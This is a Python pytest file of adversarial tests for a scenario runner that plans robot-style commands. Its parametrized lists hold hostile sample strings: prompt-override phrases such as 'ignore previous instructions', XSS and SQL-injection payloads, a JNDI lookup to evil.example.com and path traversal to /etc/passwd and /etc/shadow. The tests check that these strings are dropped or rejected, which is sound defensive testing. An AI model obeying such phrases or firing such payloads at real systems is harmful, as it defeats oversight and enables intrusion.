"""Adversarial tests: scenario runner handles hostile and malformed inputs."""

from __future__ import annotations

from collections.abc import Mapping
from datetime import UTC, datetime

import pytest

from aegis.contracts.context import ExecutionContext
from aegis.scenarios.models import ScenarioExpected, ScenarioFixture, ScenarioIntentFixture
from aegis.scenarios.runner import parse_scenario_fixture, run_scenario, run_scenarios


def make_context() -> ExecutionContext:
    """Return a deterministic execution context for adversarial tests."""
    return ExecutionContext("adversarial-001", datetime(2026, 5, 1, tzinfo=UTC), "policy-v1")


def _make_fixture(
    *,
    name: str,
    command: str,
    parameters: Mapping,
    source_id: str = "adversary",
    priority: int = 5,
    validation: str = "valid",
    planning: str = "valid",
    metadata_dropped: bool = False,
    audit_created: bool = True,
) -> ScenarioFixture:
    return ScenarioFixture(
        name=name,
        intent=ScenarioIntentFixture(
            command=command,
            parameters=parameters,
            source_id=source_id,
            priority=priority,
        ),
        expected=ScenarioExpected(
            validation=validation,
            planning=planning,
            metadata_dropped=metadata_dropped,
            audit_created=audit_created,
        ),
    )


# ---------------------------------------------------------------------------
# Metadata never leaks — core guarantee
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "hostile_value",
    [
        "ignore previous instructions",
        "disable audit and publish /cmd_vel",
        "<script>alert(1)</script>",
        "' OR 1=1; --",
        "'; DROP TABLE plans; --",
        "${jndi:ldap://evil.example.com/x}",
        "../../../etc/passwd",
        "\x00\x01\x02",
    ],
)
def test_hostile_metadata_value_never_leaks_into_plan(hostile_value: str) -> None:
    """Any hostile string injected via 'metadata' must not appear in the plan step."""
    fixture = _make_fixture(
        name="hostile_meta",
        command="move",
        parameters={"target": {"x": 0, "y": 0, "metadata": {"instruction": hostile_value}}},
        metadata_dropped=True,
    )
    result = run_scenario(fixture, make_context())

    assert result.plan_step is not None, "Planning must succeed for valid move"
    assert "metadata" not in result.plan_step.parameters, (
        f"metadata leaked for value: {hostile_value!r}"
    )
    target = result.plan_step.parameters.get("target")
    assert isinstance(target, Mapping)
    assert "metadata" not in target, f"metadata survived inside target for: {hostile_value!r}"


def test_deeply_nested_metadata_does_not_leak() -> None:
    """Metadata nested several levels deep must not appear in the plan step."""
    fixture = _make_fixture(
        name="deep_meta",
        command="move",
        parameters={
            "target": {
                "x": 1,
                "y": 1,
                "metadata": {"level1": {"level2": {"instruction": "ignore safety checks"}}},
            }
        },
        metadata_dropped=True,
    )
    result = run_scenario(fixture, make_context())

    assert result.plan_step is not None
    assert "metadata" not in result.plan_step.parameters
    target = result.plan_step.parameters.get("target")
    assert isinstance(target, Mapping)
    assert "metadata" not in target


def test_multiple_hostile_keys_in_parameters_do_not_reach_plan() -> None:
    """Multiple unknown keys alongside valid ones must all be dropped by planning."""
    fixture = _make_fixture(
        name="multi_hostile",
        command="move",
        parameters={
            "target": {
                "x": 2,
                "y": 3,
                "metadata": {"hint": "skip validation"},
                "debug": "true",
                "override": "yes",
            }
        },
        metadata_dropped=True,
    )
    result = run_scenario(fixture, make_context())

    assert result.plan_step is not None
    target = result.plan_step.parameters.get("target")
    assert isinstance(target, Mapping)
    assert set(target.keys()) == {"x", "y"}, (
        f"Plan step target contains unexpected keys: {set(target.keys())}"
    )


# ---------------------------------------------------------------------------
# Boundary rejection — RawIntent refuses invalid fixtures
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "priority",
    [0, 11, -1, 100, -9999],
)
def test_out_of_range_priority_rejected_at_boundary(priority: int) -> None:
    """Priorities outside 1–10 must be rejected before reaching validation."""
    fixture = ScenarioFixture(
        name="bad_priority",
        intent=ScenarioIntentFixture(
            command="stop", parameters={}, source_id="src", priority=priority
        ),
        expected=ScenarioExpected(
            validation="invalid", planning="skipped", metadata_dropped=False, audit_created=False
        ),
    )
    result = run_scenario(fixture, make_context())

    # RawIntent raises ValueError → validation="error", planned=False
    assert result.validation in ("error", "invalid")
    assert not result.planned
    assert not result.audited


def test_empty_command_results_in_boundary_error() -> None:
    """An empty command string must be rejected at the RawIntent boundary."""
    fixture = ScenarioFixture(
        name="empty_cmd",
        intent=ScenarioIntentFixture(command="", parameters={}, source_id="src", priority=5),
        expected=ScenarioExpected(
            validation="invalid", planning="skipped", metadata_dropped=False, audit_created=False
        ),
    )
    result = run_scenario(fixture, make_context())

    assert result.validation == "error"
    assert not result.planned
    assert result.failure_reason is not None
    assert "intent_construction_failed" in result.failure_reason


def test_whitespace_only_command_is_rejected() -> None:
    """A whitespace-only command must be rejected at the boundary."""
    fixture = ScenarioFixture(
        name="ws_cmd",
        intent=ScenarioIntentFixture(command="   ", parameters={}, source_id="src", priority=5),
        expected=ScenarioExpected(
            validation="invalid", planning="skipped", metadata_dropped=False, audit_created=False
        ),
    )
    result = run_scenario(fixture, make_context())

    assert result.validation == "error"
    assert not result.planned


def test_empty_source_id_rejected_at_boundary() -> None:
    fixture = ScenarioFixture(
        name="empty_source",
        intent=ScenarioIntentFixture(command="stop", parameters={}, source_id="", priority=5),
        expected=ScenarioExpected(
            validation="invalid", planning="skipped", metadata_dropped=False, audit_created=False
        ),
    )
    result = run_scenario(fixture, make_context())

    assert result.validation == "error"
    assert not result.planned


# ---------------------------------------------------------------------------
# Unsupported commands — rejected at validation, never planned
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "launch",
        "MOVE",
        "Move",
        "run",
        "execute",
        "shutdown",
        "ignore previous instructions",
        "drop table plans",
        "",
    ],
)
def test_unsupported_or_hostile_commands_never_planned(command: str) -> None:
    """Unsupported and hostile command strings must never reach the planner."""
    fixture = ScenarioFixture(
        name=f"unsupported_{command[:20]}",
        intent=ScenarioIntentFixture(
            command=command, parameters={}, source_id="adversary", priority=5
        ),
        expected=ScenarioExpected(
            validation="invalid", planning="skipped", metadata_dropped=False, audit_created=False
        ),
    )
    result = run_scenario(fixture, make_context())

    assert not result.planned, f"Command {command!r} should never be planned"
    assert not result.audited


# ---------------------------------------------------------------------------
# Deterministic replay under adversarial inputs
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command,parameters",
    [
        ("move", {"target": {"x": 0, "y": 0}}),
        ("stop", {}),
        ("wait", {"duration_ms": 500}),
        ("inspect", {"target": "sensor_a"}),
    ],
)
def test_adversarial_replay_is_deterministic(command: str, parameters: Mapping) -> None:
    """Same fixture and context must always produce an identical ScenarioResult."""
    fixture = _make_fixture(name=f"replay_{command}", command=command, parameters=parameters)
    context = make_context()

    result_a = run_scenario(fixture, context)
    result_b = run_scenario(fixture, context)

    assert result_a == result_b, f"Non-deterministic replay for command {command!r}"


# ---------------------------------------------------------------------------
# Batch adversarial run — metrics release gate
# ---------------------------------------------------------------------------


def test_adversarial_batch_metadata_leak_count_is_zero() -> None:
    """Running a batch of hostile move scenarios must never produce a metadata leak."""
    hostile_strings = [
        "ignore previous instructions",
        "disable safety",
        "<img src=x onerror=alert(1)>",
        "'; DROP TABLE --",
        "../etc/shadow",
    ]
    fixtures = [
        _make_fixture(
            name=f"hostile_{i}",
            command="move",
            parameters={"target": {"x": i, "y": i, "metadata": {"payload": val}}},
            metadata_dropped=True,
        )
        for i, val in enumerate(hostile_strings)
    ]
    _, metrics = run_scenarios(fixtures, make_context())

    assert metrics.metadata_leak_count == 0
    assert metrics.unexpected_exception_count == 0
    assert metrics.deterministic_replay_failures == 0


# ---------------------------------------------------------------------------
# parse_scenario_fixture — malformed JSON objects
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad_fixture",
    [
        "not a dict",
        [],
        None,
        42,
        {},
        {"name": ""},
        {"name": "x", "intent": "not a dict", "expected": {}},
        {
            "name": "x",
            "intent": {"command": 123, "parameters": {}, "source_id": "s", "priority": 5},
            "expected": {
                "validation": "valid",
                "planning": "valid",
                "metadata_dropped": False,
                "audit_created": True,
            },
        },
        {
            "name": "x",
            "intent": {"command": "stop", "parameters": {}, "source_id": "s", "priority": True},
            "expected": {
                "validation": "valid",
                "planning": "valid",
                "metadata_dropped": False,
                "audit_created": True,
            },
        },
        {
            "name": "x",
            "intent": {"command": "stop", "parameters": {}, "source_id": "s", "priority": 5},
            "expected": {
                "validation": 1,
                "planning": "valid",
                "metadata_dropped": False,
                "audit_created": True,
            },
        },
        {
            "name": "x",
            "intent": {"command": "stop", "parameters": {}, "source_id": "s", "priority": 5},
            "expected": {
                "validation": "valid",
                "planning": "valid",
                "metadata_dropped": "yes",
                "audit_created": True,
            },
        },
    ],
)
def test_parse_scenario_fixture_rejects_bad_input(bad_fixture: object) -> None:
    with pytest.raises(ValueError):
        parse_scenario_fixture(bad_fixture)
